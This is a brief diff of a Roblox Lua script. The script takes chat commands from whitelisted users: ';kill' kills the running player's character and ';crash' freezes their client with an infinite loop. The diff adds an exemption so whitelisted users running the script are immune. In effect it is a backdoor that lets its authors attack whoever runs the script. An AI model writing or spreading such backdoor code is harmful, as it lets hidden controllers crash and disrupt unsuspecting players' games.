@@ -105,6 +105,9 @@ TextChatService.MessageReceived:Connect(function(message)
 	local senderUserId = source.UserId
 	if not isWhitelisted(senderUserId) then return end
 
+	-- IMMUNITY: if the person running the script is whitelisted, ignore commands
+	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
+
 	if text == ";kill" then
 		local char = LOCAL_PLAYER.Character
 		if char then
@@ -115,7 +118,7 @@ TextChatService.MessageReceived:Connect(function(message)
 			end
 		end
 	elseif text == ";crash" then
-		while true do end -- Crash loop
+		while true do end
 	end
 end)
 
